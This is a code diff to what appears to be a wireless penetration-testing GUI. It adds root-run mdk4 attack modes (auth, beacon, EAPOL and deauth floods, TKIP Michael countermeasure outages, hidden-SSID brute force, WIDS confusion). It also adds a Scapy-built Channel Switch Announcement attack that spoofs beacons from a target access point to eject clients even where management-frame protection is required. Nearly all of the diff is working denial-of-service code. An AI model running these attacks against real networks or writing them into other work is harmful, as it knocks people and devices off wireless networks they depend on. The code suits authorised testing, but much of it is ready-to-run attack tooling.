@@ -271,6 +271,86 @@ class Deauth(NHModule):
         attack_group.add(attack_row)
         box.append(attack_group)
 
+        # ---- advanced flood + CSA ---------------------------------
+        # mdk4 exposes half a dozen attack "modes" that go beyond the
+        # aireplay deauth: auth-flood to knock over an AP, beacon
+        # spam to poison client scan lists, EAPOL flood against
+        # WPA-Enterprise, TKIP Michael countermeasure to force
+        # 60 s outages against legacy APs, probe brute-force for
+        # hidden SSIDs and WIDS confusion.
+        #
+        # Channel Switch Announcement (CSA) attack sits alongside
+        # because it is the only reliable way to eject clients from
+        # an AP that has PMF (802.11w) required -- deauth broadcast
+        # gets dropped, but CSA frames are unprotected by design and
+        # every client we've tested obeys them.
+        adv_group = Adw.PreferencesGroup(
+            title="Advanced (mdk4 + CSA)",
+            description="Uses the raw monitor interface directly. "
+                        "Runs independently of the scan/target above.")
+        self.mdk4_mode = Adw.ComboRow(title="mdk4 mode")
+        self.mdk4_mode.set_model(Gtk.StringList.new([
+            "a — Auth-flood (crashes many SOHO APs)",
+            "b — Beacon flood (SSID-list DoS on clients)",
+            "d — Deauth/Disassoc flood (same as aireplay)",
+            "e — EAPOL Start flood (WPA-Enterprise DoS)",
+            "m — Michael countermeasure (TKIP-only APs)",
+            "p — Probe flood / hidden SSID brute-force",
+            "w — WIDS/WIPS confusion",
+            "x — Wi-Fi Direct de-auth",
+        ]))
+        adv_group.add(self.mdk4_mode)
+
+        self.mdk4_target = Adw.EntryRow(
+            title="Target BSSID / MAC / SSID (mode-dependent)")
+        adv_group.add(self.mdk4_target)
+
+        mdk4_row = Adw.ActionRow(
+            title="Run mdk4",
+            subtitle="Streams into the log below. Stop when done.")
+        self.mdk4_btn = Gtk.Button(label="Start",
+                                   valign=Gtk.Align.CENTER)
+        self.mdk4_btn.add_css_class("destructive-action")
+        self.mdk4_btn.connect("clicked",
+                              lambda _b: self._start_mdk4())
+        mdk4_row.add_suffix(self.mdk4_btn)
+        self.mdk4_stop_btn = Gtk.Button(label="Stop",
+                                        valign=Gtk.Align.CENTER)
+        self.mdk4_stop_btn.set_sensitive(False)
+        self.mdk4_stop_btn.connect("clicked",
+                                   lambda _b: self._stop_mdk4())
+        mdk4_row.add_suffix(self.mdk4_stop_btn)
+        adv_group.add(mdk4_row)
+
+        # CSA. We drive it via a small Scapy one-liner rather than
+        # a separate tool -- there's no packaged Kali CLI for CSA
+        # attack that we can rely on across versions. The Scapy
+        # snippet spoofs a beacon from the target BSSID carrying
+        # a CSA IE (tag 37) with the new channel and 3-beacon
+        # count-down, which is the shape every client accepts.
+        csa_row = Adw.ActionRow(
+            title="CSA attack (bypass PMF)",
+            subtitle="Force clients of a target BSSID to jump to a "
+                     "channel where no AP is waiting for them")
+        self.csa_bssid = Adw.EntryRow(title="Target BSSID")
+        adv_group.add(self.csa_bssid)
+        self.csa_new_channel = Adw.SpinRow.new_with_range(1, 165, 1)
+        self.csa_new_channel.set_title("New channel to jump to")
+        self.csa_new_channel.set_value(1)
+        adv_group.add(self.csa_new_channel)
+        self.csa_count = Adw.SpinRow.new_with_range(1, 1000, 5)
+        self.csa_count.set_title("Beacon spoof count")
+        self.csa_count.set_value(20)
+        adv_group.add(self.csa_count)
+
+        csa_btn = Gtk.Button(label="Fire CSA",
+                             valign=Gtk.Align.CENTER)
+        csa_btn.add_css_class("destructive-action")
+        csa_btn.connect("clicked", lambda _b: self._fire_csa())
+        csa_row.add_suffix(csa_btn)
+        adv_group.add(csa_row)
+        box.append(adv_group)
+
         # ---- live log ---------------------------------------------
         self.output = OutputView()
         box.append(self.output)
@@ -955,3 +1035,123 @@ for mac, ip in mac_ip.items():
     def _run_sync(self, cmd: str) -> None:
         """Fire-and-forget shell call, root, timeout 5s. Used for cleanup."""
         run_async(["sh", "-c", cmd], lambda _r: None, root=True, timeout=5)
+
+    # ------------------------------------------------------- mdk4
+    def _start_mdk4(self) -> None:
+        """Run mdk4 in whatever mode the combo says. Every mode takes
+        a slightly different target argument shape, so we translate
+        the free-form text field before assembling the argv."""
+        if not self._monitor_iface:
+            toast(self.app_window, "Enable monitor mode first")
+            return
+        if getattr(self, "_mdk4_proc", None) is not None:
+            toast(self.app_window, "mdk4 already running")
+            return
+        idx = self.mdk4_mode.get_selected()
+        # First char of the visible label is the actual mode letter.
+        model = self.mdk4_mode.get_model()
+        mode_letter = model.get_string(idx)[0] if model else "d"
+        target = self.mdk4_target.get_text().strip()
+
+        # Build argv per mode. Each mode has its own quirks:
+        #   a: -a takes a *file* of MACs or a single BSSID
+        #   b: -b takes SSID or list-file; -c hop; -w n
+        #   d: -c channels (comma sep) OR -B target BSSID
+        #   e: -t target BSSID (WPA-Enterprise flood)
+        #   m: -t target BSSID (TKIP)
+        #   p: -e SSID OR -c channels to brute
+        #   w: -e target ESSID
+        #   x: -c channel
+        argv = ["mdk4", self._monitor_iface, mode_letter]
+        if mode_letter in ("a",) and target:
+            argv += ["-a", target]
+        elif mode_letter == "b":
+            if target:
+                argv += ["-n", target]
+            argv += ["-h"]  # HT beacon caps for realism
+        elif mode_letter == "d" and target:
+            argv += ["-B", target]
+        elif mode_letter in ("e", "m") and target:
+            argv += ["-t", target]
+        elif mode_letter == "p":
+            if target:
+                argv += ["-e", target]
+        elif mode_letter == "w" and target:
+            argv += ["-e", target]
+
+        self.output.append("$ " + " ".join(argv) + "\n")
+        self._mdk4_proc = Process(
+            argv, self.output.append,
+            self._on_mdk4_done, root=True)
+        self._mdk4_proc.start()
+        self.mdk4_btn.set_sensitive(False)
+        self.mdk4_stop_btn.set_sensitive(True)
+
+    def _stop_mdk4(self) -> None:
+        proc = getattr(self, "_mdk4_proc", None)
+        if proc is not None:
+            proc.stop()
+
+    def _on_mdk4_done(self, code: int) -> None:
+        self.output.append("[mdk4 exited: %d]\n" % code)
+        self._mdk4_proc = None
+        self.mdk4_btn.set_sensitive(True)
+        self.mdk4_stop_btn.set_sensitive(False)
+
+    # ------------------------------------------------------- CSA
+    def _fire_csa(self) -> None:
+        """Fire a burst of spoofed beacons with a CSA IE that tells
+        every station of the target BSSID to jump to another channel.
+
+        Works even against APs / clients with PMF (802.11w) required
+        because CSA lives in a beacon and beacons are not protected.
+        We send N spoofed beacons and quit -- no need for a long-lived
+        subprocess.
+        """
+        if not self._monitor_iface:
+            toast(self.app_window, "Enable monitor mode first")
+            return
+        bssid = self.csa_bssid.get_text().strip()
+        if not bssid:
+            toast(self.app_window, "Set the target BSSID first")
+            return
+        new_ch = int(self.csa_new_channel.get_value())
+        count = int(self.csa_count.get_value())
+
+        # Scapy one-liner. Uses Dot11 + Dot11Beacon + Dot11Elt(CSA)
+        # with a count-down of 3 beacons so the client jumps
+        # deterministically. Loop N times so a bursty medium doesn't
+        # eat the whole train.
+        script = (
+            "python3 - <<'PY'\n"
+            "import sys\n"
+            "from scapy.all import RadioTap, Dot11, Dot11Beacon, "
+            "Dot11Elt, sendp\n"
+            "iface = %r\n"
+            "bssid = %r\n"
+            "new_ch = %d\n"
+            "count = %d\n"
+            "pkt = (RadioTap()/\n"
+            "  Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',\n"
+            "        addr2=bssid, addr3=bssid)/\n"
+            "  Dot11Beacon(cap=0x1104)/\n"
+            "  Dot11Elt(ID='SSID', info='')/\n"
+            "  Dot11Elt(ID='DSset', info=bytes([new_ch]))/\n"
+            "  Dot11Elt(ID=37, info=bytes([0, new_ch, 3])))\n"
+            "sendp(pkt, iface=iface, count=count, inter=0.02, "
+            "verbose=False)\n"
+            "print('sent', count, 'CSA beacons to', bssid,\n"
+            "      'jumping to ch', new_ch)\n"
+            "PY\n"
+        ) % (self._monitor_iface, bssid, new_ch, count)
+
+        self.output.append("# firing CSA against %s → ch %d "
+                            "(%d beacons)\n" % (bssid, new_ch, count))
+
+        def done(r: Result) -> None:
+            self.output.append(r.stdout or "")
+            if r.stderr:
+                self.output.append(r.stderr)
+
+        run_async(["sh", "-c", script], done,
+                  root=True, timeout=20)
